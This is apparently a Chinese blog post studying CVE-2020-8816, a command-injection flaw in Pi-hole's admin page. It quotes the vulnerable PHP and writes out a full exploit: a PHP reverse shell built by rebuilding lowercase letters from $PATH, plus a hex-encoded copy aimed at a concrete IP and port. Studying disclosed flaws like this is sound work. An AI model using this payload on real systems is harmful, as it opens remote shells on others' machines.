---
layout:     post                    # 使用的布局（不需要改）
title:      CVE-2020-8816的学习-远程代码执行               # 标题 
subtitle:   远程代码执行的一个学习
date:       2020-04-02             # 时间
author:     z0L1n                      # 作者
header-img: img/post-bg-2015.jpg    #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
    - 基础
---

##  先截取一些有关的重要源码：
```
function validMAC($mac_addr)
{
  // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)
  return (preg_match('/([a-fA-F0-9]{2}[:]?){6}/', $mac_addr) == 1);
}
$mac = $_POST["AddMAC"];
if(!validMAC($mac))
{
         $error .= "MAC address (".htmlspecialchars($mac).") is invalid!<br>";
}
$mac = strtoupper($mac);
if(!strlen($error))
{
       exec("sudo pihole -a addstaticdhcp ".$mac." ".$ip." ".$hostname);
       $success .= "A new static address has been added";
}
break;
```
简单解析一下：用POST的方法获取mac地址，然后使用正则判断是否符合mac地址规则，然后把所有的字符用strtoupper处理，就没有小写字母了，最后传入exec函数执行。

## 0x00 EXPLOIT(漏洞已经披露，我就学习思想吧):
- 对于**preg_match**函数，一旦匹配成功即返回1，这里的正则匹配可以让用户输入构造超预期长度的字符串类似```aaaaaaaaaaaa&&fajifla```,所以可在后面拼接
我们的其他命令，利用连接符即可。由于这是php代码，我们就用php一句话反弹shell吧，初步构造：  
```aaaaaaaaaaaa&&php -r ‘$sock=fsockopen(“ip”,port);exec(“/bin/sh -i <&3 >&3 2>&3”);’```  
- 然后该payload会经过strtoupper函数的处理，会将```php -r ```转化为``` PHP -R```，在linux下大小写敏感，会导致该payload失败，出现“PHP not found”。  
- 接下来就是一个比较犀利的操作了，作者通过构造aaaaaaaaaaaa$PATH获取了环境变量信息，恰好里面有p、h、r的字符，然后就是我第一次见到的操作了：
- 由于上条payload返回了以下内容：```AAAAAAAAAAAA/opt/pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin```  
```
接下来就是利用shell来处理：  
W=${PATH#/???/}  
P=${W%%?????:}  
X=${PATH#/???/??}  
H=${X%%???:}  
Z=${PATH#:/??}  
R=${Z%%/}
```
这里的用法就是让'''P H R'''匹配'''p h r'''，这里涉及到shell的字符串处理，还算是简单的，```#```删除后面跟着的匹配字符串，```%%```截取从尾部最远的匹配删除。
然后构造：
```
aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}
&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS’EXEC(HEX2BIN(“706870202D72202724736F636B3D66736F636B6F70656E28223
1302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27”));’&&
```
其中hextobin里面的内容为php -r ‘$sock=fsockopen(“ip”,port);exec(“/bin/sh -i <&3 >&3 2>&3”);’，这样子我们就清晰了，
构造php -r exec去执行php -r ‘$sock=fsockopen(“ip”,port);exec(“/bin/sh -i <&3 >&3 2>&3”);’，这样子攻击就完成了，作者成功getshell。

## 0x01总结：  
- 一、正则绕过：对于正则的匹配进行清晰地摸查，为后续的构造提供一些必要的准备。
- 二、通过已存在变量获取我们需要的资源，是一个常用的想法，因为这是大多人会忽略的地方。
此次学习中，有些个人心得，有些业务功能是可以从功能上分析出可能会使用到系统函数或者可以执行命令的函数的，能有源码的情况下，挖掘命令执行会比较
有针对性，针对过滤函数的绕过需要不断的学习总结学习总结，然后去测试绕过，shell命令在RCE中是挺重要的，随着防护的加强，我们需要的是更加笃实的基础
利用更加有效的方式来进行，该次学习中，收获挺大，善于利用shell、和编码组合能有奇效O(∩_∩)O哈哈~，以后会多思考不同方式的配合来测试漏洞的。



